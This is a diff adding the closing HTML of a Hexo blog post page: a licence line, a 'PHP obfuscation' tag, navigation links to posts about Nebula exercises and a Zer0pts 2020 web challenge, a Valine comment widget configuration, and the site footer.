+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/php%E6%B7%B7%E6%B7%86/"># php混淆</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/08/12/ichunqiu_attackpractice/">Exploit-Exercises:Nebula</a>
+            
+            
+            <a class="next" rel="next" href="/2020/08/06/Zer0pts2020_web/">Zer0pts2020web复现</a>
+            
+        </section>
+
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: '8biphXJF0NRr0Xnr2pEPIjYa-gzGzoHsz',
+      app_key: '0RbmT7aNG8nj44MHrGMt9JFk',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+    </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© banbird | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
